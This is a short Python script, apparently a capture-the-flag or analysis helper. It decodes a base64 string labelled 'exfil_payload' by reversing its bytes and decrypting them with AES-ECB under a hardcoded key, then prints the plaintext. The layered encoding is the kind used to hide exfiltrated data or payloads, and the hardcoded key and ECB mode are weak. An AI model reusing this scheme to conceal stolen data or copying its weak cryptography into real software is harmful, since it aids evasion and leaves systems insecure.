import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
from hashlib import sha256

def decrypt_payload(payload_b64, key=b'supersecretkey'):
    # Reconstruct key
    key = sha256(key).digest()
    
    # Step 1: base64 decode
    encrypted = base64.b64decode(payload_b64)
    
    # Step 2: reverse the bytes
    reversed_encrypted = encrypted[::-1]
    
    # Step 3: AES decrypt (ECB)
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted = cipher.decrypt(reversed_encrypted)
    
    # Step 4: Unpad
    try:
        return unpad(decrypted, 16).decode()
    except:
        return "[DECRYPTION FAILED]"

# === YOUR PAYLOAD HERE ===
exfil_payload = "edPrqfM0u0gHXRFTKQVV9x74HN278LhoU3jUql9NVZgNzLwCfQWcBrJ5No5LW4w9KXnyc9SgdyvPJy8+jY0tbRWOBVI4qNXqtzNXrYkU9lrnKS9nyZVSQNEhABfwwW7yzIwApqRT6+yGCH9p93YGoFx7+xJPX3lKdHGrqIyJauF4+T9SrsBDV7nCq9qlfzE1KXnyc9SgdyvPJy8+jY0tbWws28FvGFt4mSraB1NEMG4pefJz1KB3K88nLz6NjS1tH8WR7l9554ZlDqDnmYrakCl58nPUoHcrzycvPo2NLW0tNCRmcZE8IjJODLC2pHfo5ykvZ8mVUkDRIQAX8MFu8oGrarwAh8MyjsdZpKIUz8XnKS9nyZVSQNEhABfwwW7yyzHD/z29CXb/YJzkZjMN5Sl58nPUoHcrzycvPo2NLW1mE0e6mxTrOHZS8ryVjo/YKXnyc9SgdyvPJy8+jY0tbWYTR7qbFOs4dlLyvJWOj9gpefJz1KB3K88nLz6NjS1tpgYJ3Zk28ysC0AoIbzOt0Sl58nPUoHcrzycvPo2NLW1mzerHbN1fLXMOPRUlrHs/KXnyc9SgdyvPJy8+jY0tbceX+aVKdg+18WD8TXwQ8sxce/sST195SnRxq6iMiWrh3Wtd3Hw0y9gadtY8HZMtdNAtmaTwMIB/gc9jbYD+P9+gzrhDxRbwrf7EwMmtOS1W"
plaintext = decrypt_payload(exfil_payload)
print(plaintext)
